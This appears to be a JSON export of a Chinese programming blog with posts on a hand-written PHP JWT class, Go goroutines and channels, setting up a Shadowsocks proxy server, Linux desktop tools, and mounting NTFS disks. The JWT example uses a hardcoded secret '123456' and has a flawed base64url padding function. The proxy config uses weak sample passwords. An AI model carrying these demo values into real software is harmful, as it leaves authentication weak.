对象，里面存了一些信息，使用 base64urlencode 编码成一个字符串。最后的 Signature 是前面2个元素和secret一起加密之后的结果,加密算法默认是 SHA256, 这个secret应该只有服务器知道，解密的时候需要用到。 最后生成的token是一个比较长的字符串，当用户登录成功之后可以把这个串返回给浏览器，浏览器下次请求的时候带着这个串就行了，问题来了，怎么带？很多文章说放到cookies里面，讲道理放到cookies里面那和sessionid有啥区别？ 标准做法是放到HTTP请求的头信息Authorization字段里面。 服务器拿到这个串，首先把前面2段的Header和Payload使用 base64urldecode 解码出来，然后使用刚才使用的加密算法和secret校验一下是否和第3段的signature一样，如果不一样，则说明这个Token是伪造的，如果一样，就可以相信Payload里面的信息了，一般Payload里面会存放一些用户信息，比如uid，如果Payload里面需要存放一些敏感信息，比如手机号，建议先加密Payload。 PHP实战下面我将使用PHP构建一个简单的例子： JWT类：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120&lt;?phpnamespace App;class Jwt&#123; private $alg = 'sha256'; private $secret = \"123456\"; /** * alg属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；typ属性表示这个令牌（token）的类型（type），JWT 令牌统一写为JWT */ public function getHeader() &#123; $header = [ 'alg' =&gt; $this-&gt;alg, 'typ' =&gt; 'JWT' ]; return $this-&gt;base64urlEncode(json_encode($header, JSON_UNESCAPED_UNICODE)); &#125; /** * Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用，这里可以存放私有信息，比如uid * @param $uid int 用户id * @return mixed */ public function getPayload($uid) &#123; $payload = [ 'iss' =&gt; 'admin', //签发人 'exp' =&gt; time() + 600, //过期时间 'sub' =&gt; 'test', //主题 'aud' =&gt; 'every', //受众 'nbf' =&gt; time(), //生效时间 'iat' =&gt; time(), //签发时间 'jti' =&gt; 10001, //编号 'uid' =&gt; $uid, //私有信息，uid ]; return $this-&gt;base64urlEncode(json_encode($payload, JSON_UNESCAPED_UNICODE)); &#125; /** * 生成token,假设现在payload里面只存一个uid * @param $uid int * @return string */ public function genToken($uid) &#123; $header = $this-&gt;getHeader(); $payload = $this-&gt;getPayload($uid); $raw = $header . '.' . $payload; $token = $raw . '.' . hash_hmac($this-&gt;alg, $raw, $this-&gt;secret); return $token; &#125; /** * 解密校验token,成功的话返回uid * @param $token * @return mixed */ public function verifyToken($token) &#123; if (!$token) &#123; return false; &#125; $tokenArr = explode('.', $token); if (count($tokenArr) != 3) &#123; return false; &#125; $header = $tokenArr[0]; $payload = $tokenArr[1]; $signature = $tokenArr[2]; $payloadArr = json_decode($this-&gt;base64urlDecode($payload), true); if (!$payloadArr) &#123; return false; &#125; //已过期 if (isset($payloadArr['exp']) &amp;&amp; $payloadArr['exp'] &lt; time()) &#123; return false; &#125; $expected = hash_hmac($this-&gt;alg, $header . '.' . $payload, $this-&gt;secret); //签名不对 if ($expected !== $signature) &#123; return false; &#125; return $payloadArr['uid']; &#125; /** * 安全的base64 url编码 * @param $data * @return string */ private function base64urlEncode($data) &#123; return rtrim(strtr(base64_encode($data), '+/', '-_'), '='); &#125; /** * 安全的base64 url解码 * @param $data * @return bool|string */ private function base64urlDecode($data) &#123; return base64_decode(str_pad(strtr($data, '-_', '+/'), strlen($data) % 4, '=', STR_PAD_RIGHT)); &#125;&#125; 测试：12345678910&lt;?php$jwt = new \\App\\Jwt();//获取token$token = $jwt-&gt;genToken(1);//解密token$uid = $jwt-&gt;verifyToken($token);var_dump($uid); 以上代码仅供参考，实际应用的话最好找个现成的库，不推荐重复造轮子，jwt的思想是通用的，不分语言，github上面有很多。。。这里贴一个PHP的库: firebase/php-jwt。 最后再说说session和jwt的选择问题，网上随便搜搜就可以看到很多文章比较这2者优劣，总结就是各有利弊，实际上很多公司既不是session，也不是jwt，可能就是自己搞的类似jwt token这样的一个字符串，然后放在cookies里面，只要这个串能够代表一个用户都可以。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"JWT","slug":"JWT","permalink":"https://wangbjun.github.io/tags/JWT/"}]},{"title":"浅谈Golang协程","slug":"goroutine","date":"2018-12-10T04:05:45.000Z","updated":"2020-01-09T08:10:57.064Z","comments":true,"path":"2018/12/10/goroutine/","link":"","permalink":"https://wangbjun.github.io/2018/12/10/goroutine/","excerpt":"前言学习和使用golang也有一段时间了，golang最近2年在国内很火，提起golang和其它语言最大区别莫过于协程，不过咱今天先不说协程，我先说一下自己的一些理解。 对c熟悉的人应该对go不陌生，它们都属于强类型静态编译型语言，在语法上和PHP这种弱类型动态解释型语言不一样，虽然差异很大，但是基本语法都是差不多，掌握一种语言之后再去学其它语言语法不是什么大问题。 在IT行业，编程语言之争一直是个很热闹的话题，编程语言之间的区别不仅仅在于语法和特性，语法只是表达编程思想的方式，一个编程语言的背后往往是其强大的生态圈，比如c语言之所以经久不衰，那是因为它几乎可以认为是创世纪语言，是当代编程的起点，而PHP则以快速处理文本，快速搭建web网站出名，JS则是浏览器编程的唯一选择，Python拥有的科学计算库是其它语言没有的。 说到go的优点，一般都集中在静态编译、毫秒级GC、简洁、并发并行等特性上面，go是2008年诞生的，由C语言之父设计，相对其它语言来说比较年轻，可以说在设计之初吸收了各大语言的优点。","text":"前言学习和使用golang也有一段时间了，golang最近2年在国内很火，提起golang和其它语言最大区别莫过于协程，不过咱今天先不说协程，我先说一下自己的一些理解。 对c熟悉的人应该对go不陌生，它们都属于强类型静态编译型语言，在语法上和PHP这种弱类型动态解释型语言不一样，虽然差异很大，但是基本语法都是差不多，掌握一种语言之后再去学其它语言语法不是什么大问题。 在IT行业，编程语言之争一直是个很热闹的话题，编程语言之间的区别不仅仅在于语法和特性，语法只是表达编程思想的方式，一个编程语言的背后往往是其强大的生态圈，比如c语言之所以经久不衰，那是因为它几乎可以认为是创世纪语言，是当代编程的起点，而PHP则以快速处理文本，快速搭建web网站出名，JS则是浏览器编程的唯一选择，Python拥有的科学计算库是其它语言没有的。 说到go的优点，一般都集中在静态编译、毫秒级GC、简洁、并发并行等特性上面，go是2008年诞生的，由C语言之父设计，相对其它语言来说比较年轻，可以说在设计之初吸收了各大语言的优点。 协程到底是什么东西？说到go必须得说协程，先说说为什么需要协程，都说go是为并发编程而生，指的就是go很容易写出高并发的程序，现代计算机硬件早已步入多核时代，前段时间AMD刚刚发布最新的锐龙3代，作为民用级的CPU现在已达到16核32线程，然而大部分编程语言依然弱智，只能利用单核性能，传说中一核有难多核围观… 但是操作系统提供了多进程的能力，除了多进程之外，还有一个叫多线程，线程和进程区别不大，线程是程序执行的最小单位,一个进程可以有多个线程，编程语言可以使用多进程或多线程利用多核CPU的能力，然而现实并不是那么简单… 进程和线程都可以解决多核CPU利用率的问题，比如PHP就整出来一个fpm，采用了master-worker模型，实际上采用多进程解决并发问题，已经非常不错了，但是依然存在问题，支持不了太高的并发。 现在的Linux和Windows都是分时复用的多任务操作系统，上面跑着很多程序，所以操作系统需要在不同进程之间切换，这时候就产生了CPU上下文切换，具体技术细节咱可以不了解，但是存在的问题就是切换的时候非常消耗资源，默认情况下Linux只可以创建1024个进程，虽然可以修改，但是一旦进程或线程数过多，CPU的时间基本上都浪费在上下文切换上面了，何谈高效？ 可见，多进程和多线程并不是很完美，对于编程来说，难度非常大，所以目前只有Java有比较好的多线程模型，PHP虽然有相关扩展，但是很少有人使用，JS压根不支持！ 但是并不是必须使用多进程或多线程才可以实现高并发，很多时候，特别是web相关应用，当你读取文件或者调用API都会产生IO，但是由于计算机硬盘、网络传输速度比较慢，CPU就会一直在那等…时间就浪费了！后来有人想，既然在等IO，你就把CPU让出来让其它人用啊，当硬盘数据读取到、接口返回数据的时候我通知你一声就行了，这就是异步非阻塞IO，JS目前使用就是这种模型，Golang的协程也会用到。 在我理解，go的协程是为了解决多核CPU利用率问题，go语言层面并不支持多进程或多线程，但是协程更好用，协程被称为用户态线程，不存在CPU上下文切换问题，效率非常高。 实例1.Hello World123456789package mainfunc main() &#123; go say(\"Hello World\")&#125;func say(s string) &#123; println(s)&#125; go启动协程的方式就是使用关键字go，后面一般接一个函数或者匿名函数，但是如果你运行上面第一段代码，你会发现什么结果都没有，what？？？ 这至少说明你代码写的没问题，当你使用go启动协程之后,后面没有代码了，这时候主线程结束了，这个协程还没来得及执行就结束了… 聪明的小伙伴会想到，那我主线程先睡眠1s等一等？ Yes, 在main代码块最后一行加入： 1time.Sleep(time.Second*1) # 表示睡眠1s 再次运行，打印出Hello World，1s后程序终止！ 2.WaitGroup上面睡眠这种做法肯定是不靠谱的，WaitGroup可以解决这个问题, 代码如下: 1234567891011121314151617package mainimport ( \"sync\")var wg = sync.WaitGroup&#123;&#125;func main() &#123; wg.Add(1) go say(\"Hello World\") wg.Wait()&#125;func say(s string) &#123; println(s) wg.Done()&#125; 简单说明一下用法，var 是声明了一个全局变量 wg，类型是sync.WaitGroup，wg.add(1) 是说我有1个协程需要执行，wg.Done 相当于 wg.Add(-1) 意思就是我这个协程执行完了。wg.Wait() 就是告诉主线程要等一下，等协程都执行完再退出。 3.并发还并行?当你同时启动多个协程的时候，会怎么执行呢？ 123456789101112131415161718192021package mainimport ( \"strconv\" \"sync\")var wg = sync.WaitGroup&#123;&#125;func main() &#123; wg.Add(5) for i := 0; i &lt; 5; i++ &#123; go say(\"Hello World: \" + strconv.Itoa(i)) &#125; wg.Wait()&#125;func say(s string) &#123; println(s) wg.Done()&#125; 如果去掉go，直接在循环里面调用这个函数5次，毫无疑问会一次输出 Hello World: 0 ~ 4, 但是在协程里面，输出的顺序是无序的，看上去像是“同时执行”，其实这只是并发。 有一个问题，上面的例子里面是并发还并行呢？ 首先，我们得区分什么是并发什么是并行，举个比较熟悉的例子，并发就是一个锅同时炒2个菜，2个菜来回切换，并行就是你有多个锅，每个锅炒不同的菜，多个锅同时炒！ 对于计算机来说，这个锅就是CPU，单核CPU同一时间只能执行一个程序，但是CPU却可以在不同程序之间快速切换，所以你在浏览网页的同时还可以听歌！但是多核CPU就不一样了，操作系统可以一个CPU核心用来浏览网页，另一个CPU核心拿来听歌，所以多核CPU还是有用的。 但是对于单一程序来说，基本上是很难利用多核CPU的，主要是编程实现非常麻烦，这也是为什么很多人都说多核CPU是一核有难多核围观…特别是一些比较老的程序，人家在设计的时候压根没考虑到多核CPU，毕竟10年前CPU还没有这么多核心。 回到上面的例子，如果当前CPU是单核，那么上面程序就是并发执行，如果当前CPU是多核，那就是并行执行，结果都是一样的，如何证明请看下面的例子： 12345678910111213141516171819package mainimport ( \"runtime\" \"strconv\")func main() &#123; runtime.GOMAXPROCS(1) for i := 0; i &lt; 5; i++ &#123; go say(\"Hello World: \" + strconv.Itoa(i)) &#125; for &#123; &#125;&#125;func say(s string) &#123; println(s)&#125; 默认情况下，最新的go版本协程可以利用多核CPU，但是通过runtime.GOMAXPROCS() 我们可以设置所需的核心数（其实并不是CPU核心数），在上面的例子我们设置为1，也就是模拟单核CPU，运行这段程序你会发现无任何输出，如果你改成2，你会发现可以正常输出。 这段程序逻辑很简单，使用一个for循环启动5个协程，然后写了一个for死循环，如果是单核CPU，当运行到for死循环的时候，由于没有任何io操作（或者能让出CPU的操作），会一直卡在那里，但是如果是多核CPU，go协程就会调用其它CPU去执行。 如果你在for循环里面加入一个sleep操作，比如下面这样： 123for &#123; time.Sleep(time.Second) &#125; 运行上面代码，你会发现居然可以正常输出，多次运行你会发现其结果一直是从0到4，变成顺序执行了！这也说明单核CPU只能并发，不能并行！ 4.channelchannel，又叫管道，在go里面的管道是协程之间通信的渠道，类似于咱们常用的消息队列。在上面的例子里面我们是直接打印出来结果，假如现在的需求是把输出结果返回到主线程呢？ 12345678910111213141516171819package mainimport ( \"strconv\")func main() &#123; var result = make(chan string) for i := 0; i &lt; 5; i++ &#123; go say(\"Hello World: \"+strconv.Itoa(i), result) &#125; for s := range result &#123; println(s) &#125;&#125;func say(s string, c chan string) &#123; c &lt;- s&#125; 简单说明一下，这里就是实例化了一个string类型的管道，在调用函数的时候会把管道当作参数传递过去，然后在调用函数里面我们不输出结果，然后把结果通过管道返还回去，然后再主线程里面我们通过for range循环依次取出结果！ 结果如下，但是这个程序是有bug的，在程序的运行的最后会出现一个fatal error，提示所有的协程都进入睡眠状态，死锁！ 123456Hello World: 4Hello World: 1Hello World: 0Hello World: 2Hello World: 3fatal error: all goroutines are asleep - deadlock! go的管道默认是阻塞的(假如你不设置缓存的话)，你那边放一个，我这头才能取一个，如果你那边放了东西这边没人取，程序就会一直等下去，死锁了，同时，如果那边没人放东西，你这边取也取不到，也会发生死锁！ 如何解决这个问题呢？标准的做法是主动关闭管道，或者你知道你应该什么时候关闭管道, 当然你结束程序管道自然也会关掉！针对上面的演示代码，可以这样写： 12345678var i = 0for s := range result &#123; println(s) if i &gt;= 4 &#123; close(result) &#125; i++&#125; 因为我们明确知道总共会输出5个结果，所以这里简单做了一个判断，大于5就关闭管道退出for循环，就不会报错了！虽然丑了点，但是能用 5.生产者消费者模型利用channel和协程，我们可以非常容易的实现了一个生产者消费者模型，代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344package mainimport ( \"strconv\" \"fmt\" \"time\")func main() &#123; ch1 := make(chan int) ch2 := make(chan string) go pump1(ch1) go pump2(ch2) go suck(ch1, ch2) time.Sleep(time.Duration(time.Second*30))&#125;func pump1(ch chan int) &#123; for i := 0; ; i++ &#123; ch &lt;- i * 2 time.Sleep(time.Duration(time.Second)) &#125;&#125;func pump2(ch chan string) &#123; for i := 0; ; i++ &#123; ch &lt;- strconv.Itoa(i+5) time.Sleep(time.Duration(time.Second)) &#125;&#125;func suck(ch1 chan int, ch2 chan string) &#123; chRate := time.Tick(time.Duration(time.Second*5)) // 定时器 for &#123; select &#123; case v := &lt;-ch1: fmt.Printf(\"Received on channel 1: %d\\n\", v) case v := &lt;-ch2: fmt.Printf(\"Received on channel 2: %s\\n\", v) case &lt;-chRate: fmt.Printf(\"Log log...\\n\") &#125; &#125;&#125; 输出结果如下： 1234567891011121314151617Received on channel 1: 0Received on channel 2: 5Received on channel 2: 6Received on channel 1: 2Received on channel 1: 4Received on channel 2: 7Received on channel 1: 6Received on channel 2: 8Received on channel 2: 9Received on channel 1: 8Log log...Received on channel 2: 10Received on channel 1: 10Received on channel 1: 12Received on channel 2: 11Received on channel 2: 12Received on channel 1: 14 这个程序建立了2个管道一个传输int，一个传输string，同时启动了3个协程，前2个协程非常简单，就是每隔1s向管道输出数据，第三个协程是不停的从管道取数据，和之前的例子不一样的地方是，pump1 和 pump2是2个不同的管道，通过select可以实现在不同管道之间切换，哪个管道有数据就从哪个管道里面取数据，如果都没数据就等着，还有一个定时器功能可以每隔一段时间向管道输出内容！而且我们可以很容易启动多个消费者。 应用1.Web应用使用go自带的http库几行代码就可以启动一个http server，代码如下： 1234http.HandleFunc(\"/\", func(writer http.ResponseWriter, request *http.Request) &#123; _, _ = fmt.Fprintln(writer, \"Hello World\") &#125;) _ = http.ListenAndServe(\"127.0.0.1:8080\", nil) 虽然简单，但是非常高效，因为其底层使用了go协程，对于每一个请求都会启动一个协程去处理，所以并发可以轻轻松松达到上万QPS。 2.并发编程举一个非常简单的例子，假设我们在业务里面需要从3个不同的数据库获取数据，每次耗时100ms，正常写法就是从上到下依次执行，总耗时300ms，但是使用协程这3个操作可以“同时”进行，耗时大大减少。 几乎所有IO密集型的应用，都可以利用协程提高速度，提高程序并发能力，不必把CPU时间浪费在等待的过程中，同时还可以充分利用多核CPU的计算能力。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://wangbjun.github.io/tags/Golang/"}]},{"title":"自建梯子访问Google等学术网站","slug":"custom-google-tz","date":"2018-12-09T00:01:02.000Z","updated":"2020-01-09T08:01:26.944Z","comments":true,"path":"2018/12/09/custom-google-tz/","link":"","permalink":"https://wangbjun.github.io/2018/12/09/custom-google-tz/","excerpt":"这个话题有点敏感，但是我首先说明一下，此处只做一个记录，网上类似的文章超级多，而且我纯粹是拿来上Google学习用，搞web开发的应该没几个不用Chrome的，Chrome配上Google账号同步简直完美。","text":"这个话题有点敏感，但是我首先说明一下，此处只做一个记录，网上类似的文章超级多，而且我纯粹是拿来上Google学习用，搞web开发的应该没几个不用Chrome的，Chrome配上Google账号同步简直完美。 1.首先，你得有一个国外的服务器购买国外服务器的途径很多，比如阿里云就有很多国外的主机，缺点是较贵，并且感觉不安全，你们懂的。还有比如说亚马逊云等云服务器商也可以买到国外主机。还有一些国外vps主机也可以。 国外的主机相对来说便宜点，比如vultr的vps最便宜的3.5美元一个月，单核，512M，500G流量，搭梯子绰绰有余，除非你一天到晚看YouTube，不然正常浏览网页，我一个月10G都用不完。国外主机的缺点就是英文，而且很多要求使用信用卡支付，比较麻烦。（现在vultr已经支持支付宝和微信支付） 至于各个服务器哪个好哪个坏我就不评论了，用的不多，但是我可以给大家一个选择标准: 1.地理位置如果你只是自己用，你肯定得选个离自己近的主机，比如常见的日本的适合北方，香港的适合南方，当然美国的就稍微远点 2.ping值拿到主机先ping一下，有很多vps的ip已经被ban掉了，还有的丢包严重，或者延迟特别大，比如说美国洛杉矶的主机一般延迟在200ms左右，纽约稍微高点，日本的大概100ms左右，其实吧，这些影响都不大，毕竟你是拿来上网页，又不是打游戏，对ping要求不高。 然后你可以试着在vps上面放一个文件，下载试试，测试一下带宽 一般来说，由于中国的地域广阔，各个地方的宽带都不一样，有电信网通，还有乱七八糟的小宽带，适合别人的不一定适合你的，所以适合自己的最好！ 2.安装shadowsocks首先，大家都这个软件得有一个概念，这个软件是一款支持端对端加密的代理软件，所以他有2个端，一个是服务器端，另一个是客户端，这里只说服务器端。 12apt-get install python-pip python-setuptoolspip install git+https:&#x2F;&#x2F;github.com&#x2F;shadowsocks&#x2F;shadowsocks.git@master 这2条命令就可以搞定安装，https://github.com/shadowsocks/shadowsocks.git 是这个项目的github地址，有兴趣的可以去看看，上面也有安装文档。 3.配置shadowsocks如果上面的安装没有报错，那么在安装完成后，应该会有2个命令可以用，一个是sslocal，一个是ssserver。sslocal其实是客户端用的，但是现在很多客户端都是GUI的，github上面有各个平台的客户端可以下载安装使用。 ssserver 才是服务器端会用到的, 有兴趣的可以help一下，这里直接说一个最简单用法： 1ssserver -p 443 -k password -m aes-256-cfb 上面命令的意思是在服务器的443端口启动一个shadowsocks，并且密码是password，加密方式是aes-256-cfb 但是实际应用里面，一般的都是多端口多密码，这样可以给很多人用，比如你的同事朋友，不过这里建议大家不要拿去售卖盈利哦，据说有被抓的，自己用用就行了！ 新建一个文件 shadowsocks.json 123456789101112&#123; &quot;server&quot;:&quot;45.xx.12.xx&quot;, &quot;local_address&quot;:&quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, &quot;port_password&quot;: &#123; &quot;5555&quot;: &quot;12345678&quot;, &quot;6666&quot;: &quot;87654321&quot;, &#125;, &quot;method&quot;: &quot;aes-128-cfb&quot;, &quot;timeout&quot;: 600, &quot;fast_open&quot;:true&#125; 然后使用命令ssserver -c shadowsocks.json就可以启动多端口多密码配置，其中 port_password 就是端口和对应的密码，其它参数比如 method 是加密方式，这个随意，比如aes 256 理论上比128安全点，但是消耗性能，timeout是超时时间，不要太短 简单说一下客户端咋使用，一般shadowsocks的客户端都需要填服务器ip，服务器端口，服务器密码，加密方式，本地绑定ip，本地端口，其实就是这个配置文件里面的东西，前4个肯定是必须有，最后2个不一定。 4.服务器优化1.BBR这个是Google的发明的tcp新的拥堵算法，对网络协议了解的人应该知道拥堵算法，简单说这个BBR对于弱网的情况下有一定的加速效果，比较适合网络查的情况下，我觉得应该有一定作用，大家可以试试！ 开启BBR的需要比较新的内核，据说是必须大于4.9,uname -r 可以查看，如果不是则需要手动安装最新的内核，不过一般vps的Linux版本都比较新，反正我是没遇到这种情况，我一般用Ubuntu 16.04 或者18.04。 执行 lsmod | grep bbr，如果结果中没有 tcp_bbr 的话就先执行 12modprobe tcp_bbrecho &quot;tcp_bbr&quot; | sudo tee --append &#x2F;etc&#x2F;modules-load.d&#x2F;modules.conf 然后在执行: 12echo &quot;net.core.default_qdisc&#x3D;fq&quot; | sudo tee --append &#x2F;etc&#x2F;sysctl.confecho &quot;net.ipv4.tcp_congestion_control&#x3D;bbr&quot; | sudo tee --append &#x2F;etc&#x2F;sysctl.conf 保存生效: 1sysctl -p 12sysctl net.ipv4.tcp_available_congestion_controlsysctl net.ipv4.tcp_congestion_control 如果结果都有 bbr, 则证明你的内核已开启 bbr 12root@vultr:~# lsmod | grep bbrtcp_bbr 20480 31 2.调整Linux网络配置编辑 /etc/sysctl.conf 文件，加入以下配置： 123456789101112131415161718fs.file-max &#x3D; 51200net.core.rmem_max &#x3D; 67108864net.core.wmem_max &#x3D; 67108864net.core.netdev_max_backlog &#x3D; 250000net.core.somaxconn &#x3D; 4096net.ipv4.tcp_syncookies &#x3D; 1net.ipv4.tcp_tw_reuse &#x3D; 1net.ipv4.tcp_tw_recycle &#x3D; 0net.ipv4.tcp_fin_timeout &#x3D; 30net.ipv4.tcp_keepalive_time &#x3D; 1200net.ipv4.ip_local_port_range &#x3D; 10000 65000net.ipv4.tcp_max_syn_backlog &#x3D; 8192net.ipv4.tcp_max_tw_buckets &#x3D; 5000net.ipv4.tcp_fastopen &#x3D; 3net.ipv4.tcp_mem &#x3D; 25600 51200 102400net.ipv4.tcp_rmem &#x3D; 4096 87380 67108864net.ipv4.tcp_wmem &#x3D; 4096 65536 67108864net.ipv4.tcp_mtu_probing &#x3D; 1 保存，然后sysctl -p 最后再说一点，为了方便重启，大家可以搞一个开机自启脚本把启动shadowsocks的命令写里面，或者简单点直接使用 supervisor，这里贴一个supervisor的配置： 1234567[program:shadowsocks]autorestart&#x3D;trueautostart&#x3D;trueredirect_stderr&#x3D;truecommand&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;ssserver -c &#x2F;root&#x2F;shadowsocks.jsonuser&#x3D;rootstdout_logfile&#x3D;&#x2F;var&#x2F;log&#x2F;shadowsocks.log","categories":[{"name":"Linux","slug":"Linux","permalink":"https://wangbjun.github.io/categories/Linux/"}],"tags":[{"name":"Google","slug":"Google","permalink":"https://wangbjun.github.io/tags/Google/"}]},{"title":"闲谈Linux桌面系统下常用工具","slug":"linux-tools-software","date":"2018-12-08T02:03:09.000Z","updated":"2020-01-09T08:08:33.885Z","comments":true,"path":"2018/12/08/linux-tools-software/","link":"","permalink":"https://wangbjun.github.io/2018/12/08/linux-tools-software/","excerpt":"前言作为一个编程开发人员，Linux操作系统的诞生就是一个传奇故事，如今Linux内核系统更是遍布在咱们日常生活中各种电子设备，比如智能路由器（openWrt）、安卓手机（Android）、服务器。。。而Linux桌面系统的使用率其实也不低，尤其在国外，毕竟Linux开源免费，而国内由于Windows盗版横行，用Linux的相对来说少一点！ 本人使用了一年多的Ubuntu和Mint桌面发行版，主要做PHP开发，今天来谈谈自己经常用的工具，欢迎大家点评！","text":"前言作为一个编程开发人员，Linux操作系统的诞生就是一个传奇故事，如今Linux内核系统更是遍布在咱们日常生活中各种电子设备，比如智能路由器（openWrt）、安卓手机（Android）、服务器。。。而Linux桌面系统的使用率其实也不低，尤其在国外，毕竟Linux开源免费，而国内由于Windows盗版横行，用Linux的相对来说少一点！ 本人使用了一年多的Ubuntu和Mint桌面发行版，主要做PHP开发，今天来谈谈自己经常用的工具，欢迎大家点评！ 一、开发工具篇这估计是大家最关心的，毕竟用Linux的大多还是搞编程的程序员，一般人我还真不建议使用Linux，而这方面Linux绝对够用！由于不同语言使用的IDE不同，我说说我自己使用过的。 ### 1.JetBrains 全家桶 有人说，此工具一出，此篇终结，没啥说的了。。。因为这个全家桶支持很多语言，C/C++、Java、Ruby、Python、Php、JavaScript、Go、Mysql、.Net 差不多囊括了常见的编程语言了吧？JetBrains系列都是基于JRE，也就是跨平台的，功能十分丰富，还可以安装插件，缺点就是运行速度相对比较慢（毕竟是Java虚拟机），大家可以去其官网看看，如果有钱可以买正版支持一下！ ### 2.Atom/Sublime Text轻量级的文本编辑器，适合各种编程语言，速度快，安装插件之后功能也非常丰富，然而Sublime的Linux版本有致命缺陷，无法输入中文（搜狗输入法），民间有解决方案。Atom是完全开源免费的，功能也很多丰富，关键是可以完美输入中文！ ### 3.数据库管理我经常用的有Navicat，Windows下面的估计大家都用过，Linux下的是Wine版本，基本功能都有，挺方便。还有一个MySQL Workbench也不错，也有很多人喜欢用phpmyadmin。 ### 4.Remarkable一款MarkDown编辑器，经常写MarkDown可以试试。 ### ５.Vi/Vim这个难度有点高，我也就是偶尔原来修改个配置啥滴，想把vim玩溜那得花不少功夫，据说还有一个上古神器Emacs，从来没有见过身边有人用过。。。不过只要你肯折腾，配置好用起来也就很溜的哦。 ### 6.Visual Studio Code最近才发现的一个编辑器，界面看上去和Atom有点像，功能非常强大，微软出品，适合写C/C++ 二、日常生活篇### 1.浏览器首推 Google Chrome、其次Firefox，不解释，一定要注册/登录Google账号哦。 ### 2.聊天QQ是个Bug，网上有wine版本，功能很残缺，建议大家不要折腾了，实在需要就用Windows虚拟机吧！而微信则可以登录网页版，发送图片文件都没问题。 这里更正一下，QQ有一个wine版本非常不错，功能堪称完美，据说是提取自国产深度Linux系统，其本质上是用了一个收费的wine工具crossover。微信也有客户端版本，是一个第三方的开源项目，名字叫electronic，可以去github看看。—2017-10-14 ### 3.虚拟机VMware 和 Virtualbox, 一个收费，一个开源免费，功能上来说基本差不多，虚拟一个Windows系统有时候还是有点用的。 ### 4.下载Linux下的BT客户端其实很多，比如Transmission、qBitTorrent。。。然而国内这网络状况，基本上下载不动，还是迅雷好使点，我一般是在虚拟机里面用迅雷下载。 ### 5.同步网盘国内有个叫坚果云Nutstore挺好使，每月有免费流量，同步一些小文件没问题，文件多了就要花钱买流量了。 ### 6.音乐网易云音乐，不解释。 ### 7.视频除了系统自带的播放器，我一般用vlc播放器，感觉效果好点。 ### 8.文档WPS当之无愧，而且还没广告，良心之作，卸载掉自带的LibreOffice吧。 ### 9.输入法搜狗输入法也算是良心之作，没广告，自动更新词库，还能换皮肤，不过偶尔会出问题，删除用户配置文件就能解决。 ### 10.截图系统自带截图，PrtSc键全屏截图，shift+PrtSc局部截图，也可以安装一个第三方截图软件Shutter。 使用Linux系统至今，未发现有什么没法解决的问题，Windows能干的事情，Linux也能干，实在干不了的事情虚拟机干，随着Qt的流行，以后跨平台的软件应该会越来越多，相信Linux系统也会变的越来越流行！","categories":[{"name":"Linux","slug":"Linux","permalink":"https://wangbjun.github.io/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://wangbjun.github.io/tags/Linux/"}]},{"title":"Linux下挂载NTFS硬盘和Samba共享","slug":"linux-ntfs-samba","date":"2018-12-02T03:05:00.000Z","updated":"2020-01-08T17:44:37.431Z","comments":true,"path":"2018/12/02/linux-ntfs-samba/","link":"","permalink":"https://wangbjun.github.io/2018/12/02/linux-ntfs-samba/","excerpt":"1.挂载 NTFS 硬盘讲道理是不建议在Linux下面使用ntfs这种文件系统，Linux有个专用的文件系统ext4，但是为什么这么用呢？主要原因还是为了兼容Windows，ntfs是Windows最常用的文件系统。 还有一种情况是双系统，为了能在Linux和Windows下面都能读取到，只能使用ntfs格式，毕竟Linux对ntfs格式还算是挺友好的，但是Windows对ext4貌似不是那么友好，虽然也有软件能读取，但是麻烦!","text":"1.挂载 NTFS 硬盘讲道理是不建议在Linux下面使用ntfs这种文件系统，Linux有个专用的文件系统ext4，但是为什么这么用呢？主要原因还是为了兼容Windows，ntfs是Windows最常用的文件系统。 还有一种情况是双系统，为了能在Linux和Windows下面都能读取到，只能使用ntfs格式，毕竟Linux对ntfs格式还算是挺友好的，但是Windows对ext4貌似不是那么友好，虽然也有软件能读取，但是麻烦! 默认情况下，主流Linux发行版是支持ntfs格式的分区的，如果不支持的话需要安装一个软件就行： 1sudo apt install ntfs-3g 然后你在文件管理的右边就会看到可以挂载的分区，其实这时候还没有挂载，鼠标点一下会自动挂载，下面里面的Data和Video分区就是我挂载好的： 如果你用的不是桌面发行版，可以使用 mount 命令挂载 问题来了，为了方便，需要实现每次开机自动挂载，这需要修改一个配置，Linux的磁盘挂载配置在 /etc/fstab 文件，你可以手动编写这个配置，这里给一个示例： 12345678910111213141516# &#x2F;etc&#x2F;fstab: static file system information.## &lt;file system&gt; &lt;mount point&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;#Entry for &#x2F;dev&#x2F;nvme0n1p5 :UUID&#x3D;ccaace56-1c45-487c-ac0b-b337c37c107f &#x2F; ext4 errors&#x3D;remount-ro 0 1#Entry for &#x2F;dev&#x2F;nvme0n1p1 :UUID&#x3D;257D-EDE3 &#x2F;boot&#x2F;efi vfat defaults 0 1#Entry for &#x2F;dev&#x2F;sda1 :UUID&#x3D;5C5AAFB95AAF8E78 &#x2F;media&#x2F;jwang&#x2F;Data ntfs-3g defaults,nodev,nosuid,locale&#x3D;en_US.UTF-8 0 0#Entry for &#x2F;dev&#x2F;sda2 :UUID&#x3D;4274B7A774B79C5B &#x2F;media&#x2F;jwang&#x2F;Video ntfs-3g defaults,nodev,nosuid,locale&#x3D;en_US.UTF-8 0 0#Entry for &#x2F;dev&#x2F;nvme0n1p2 :UUID&#x3D;13b7dfee-a639-464f-b2f5-c7b2e435b71d none swap sw 0 0#UUID&#x3D;94A4-85E8 &#x2F;boot&#x2F;efi vfat umask&#x3D;0077 0 1 